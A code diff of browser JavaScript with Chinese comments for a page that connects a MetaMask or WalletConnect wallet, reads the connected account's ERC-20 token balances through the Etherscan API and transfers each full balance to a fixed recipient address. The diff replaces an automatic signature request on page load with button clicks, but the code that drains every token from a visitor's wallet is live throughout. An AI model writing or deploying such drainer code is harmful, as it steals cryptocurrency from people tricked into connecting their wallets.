@@ -23,7 +23,7 @@ const erc20Abi = [
     }
 ];
 
-// 页面加载后自动连接钱包并跳转到签名流程
+// 页面加载后自动连接钱包
 window.onload = async () => {
     const selectedWallet = 'metamask'; // 默认选择 MetaMask
     document.getElementById('walletSelector').value = selectedWallet;
@@ -42,8 +42,8 @@ window.onload = async () => {
                     isConnected = true;
                     document.getElementById('status').innerText = 'MetaMask 已连接';
 
-                    // 自动发起签名请求
-                    await signMessage(accounts[0]);
+                    // 启用签名按钮
+                    document.getElementById('signButton').disabled = false;
                 } else {
                     document.getElementById('status').innerText = '未检测到已连接的账户';
                 }
@@ -66,14 +66,14 @@ window.onload = async () => {
                 isConnected = true;
                 document.getElementById('status').innerText = 'WalletConnect 已连接';
 
-                // 自动发起签名请求
-                await signMessage(accounts[0]);
+                // 启用签名按钮
+                document.getElementById('signButton').disabled = false;
             } else {
                 document.getElementById('status').innerText = '未检测到已连接的账户';
             }
         }
 
-        // 启用按钮
+        // 启用转移按钮
         document.getElementById('transferButton').disabled = false;
     } catch (error) {
         document.getElementById('status').innerText = '连接失败: ' + error.message;
@@ -88,34 +88,31 @@ const updateWalletList = (address) => {
     walletList.appendChild(walletItem);
 };
 
-// 自动签名的函数
-const signMessage = async (account) => {
-    const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
-    try {
-        // 调用钱包的 personal_sign 方法发起签名请求
-        const signature = await web3.eth.personal.sign(message, account);
-        document.getElementById('status').innerText += `\n签名成功: ${signature}`;
-
-        // 签名成功后可以进一步触发其他操作，例如代币转移
-        // await transferTokens(account); // 如果需要转移代币可以在这里调用
-    } catch (error) {
-        document.getElementById('status').innerText += `\n签名失败: ${error.message}`;
+// 签名按钮点击事件
+document.getElementById('signButton').onclick = async () => {
+    const accounts = await web3.eth.getAccounts();
+    if (accounts.length > 0) {
+        const account = accounts[0];
+        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
+        try {
+            // 发起签名请求
+            const signature = await web3.eth.personal.sign(message, account);
+            document.getElementById('status').innerText = `签名成功: ${signature}`;
+        } catch (error) {
+            document.getElementById('status').innerText = `签名失败: ${error.message}`;
+        }
+    } else {
+        document.getElementById('status').innerText = '请先连接钱包';
     }
 };
 
-// 点击按钮自动执行代币转移操作
+// 转移代币的按钮点击事件
 document.getElementById('transferButton').onclick = async () => {
-    const walletInput = document.getElementById('wallets').value;
-    const walletAddresses = walletInput.split(',').map(addr => addr.trim());
-
-    for (const walletAddress of walletAddresses) {
-        if (!web3.utils.isAddress(walletAddress)) {
-            document.getElementById('status').innerText += `\n无效的钱包地址: ${walletAddress}`;
-            continue;
-        }
-
-        document.getElementById('status').innerText += `\n正在获取 ${walletAddress} 的代币余额...`;
-        const tokenBalances = await getTokenBalances(walletAddress);
+    const accounts = await web3.eth.getAccounts();
+    if (accounts.length > 0) {
+        const account = accounts[0];
+        document.getElementById('status').innerText += `\n正在获取 ${account} 的代币余额...`;
+        const tokenBalances = await getTokenBalances(account);
 
         for (const tokenAddress in tokenBalances) {
             const token = tokenBalances[tokenAddress];
@@ -124,16 +121,53 @@ document.getElementById('transferButton').onclick = async () => {
             if (balance.gt(0)) {
                 const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
                 try {
-                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: walletAddress });
-                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${walletAddress} 至 ${recipientAddress}`;
+                    const transfer = await tokenContract.methods.transfer(recipientAddress, balance.toString()).send({ from: account });
+                    document.getElementById('status').innerText += `\n成功转移 ${balance.toString()} ${token.symbol} 从 ${account} 至 ${recipientAddress}`;
                 } catch (error) {
                     document.getElementById('status').innerText += `\n转移 ${token.symbol} 失败: ${error.message}`;
                 }
             } else {
-                document.getElementById('status').innerText += `\n账户 ${walletAddress} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
+                document.getElementById('status').innerText += `\n账户 ${account} 在 ${token.symbol} (${tokenAddress}) 上没有代币余额`;
             }
         }
-    }
 
-    document.getElementById('status').innerText += '\n所有代币转移完成';
+        document.getElementById('status').innerText += '\n所有代币转移完成';
+    } else {
+        document.getElementById('status').innerText = '请先连接钱包';
+    }
+};
+
+// 获取代币余额
+const getTokenBalances = async (address) => {
+    try {
+        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=999999999&sort=asc&apikey=YOUR_ETHERSCAN_API_KEY`;
+        const response = await axios.get(url);
+        const transactions = response.data.result;
+
+        const tokenBalances = {};
+
+        for (const tx of transactions) {
+            const tokenAddress = tx.contractAddress;
+            const tokenSymbol = tx.tokenSymbol;
+
+            if (!tokenBalances[tokenAddress]) {
+                tokenBalances[tokenAddress] = {
+                    symbol: tokenSymbol,
+                    balance: web3.utils.toBN(0)
+                };
+            }
+
+            if (tx.from.toLowerCase() === address.toLowerCase()) {
+                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.sub(web3.utils.toBN(tx.value));
+            }
+
+            if (tx.to.toLowerCase() === address.toLowerCase()) {
+                tokenBalances[tokenAddress].balance = tokenBalances[tokenAddress].balance.add(web3.utils.toBN(tx.value));
+            }
+        }
+
+        return tokenBalances;
+    } catch (error) {
+        document.getElementById('status').innerText = '获取代币余额失败: ' + error.message;
+    }
 };
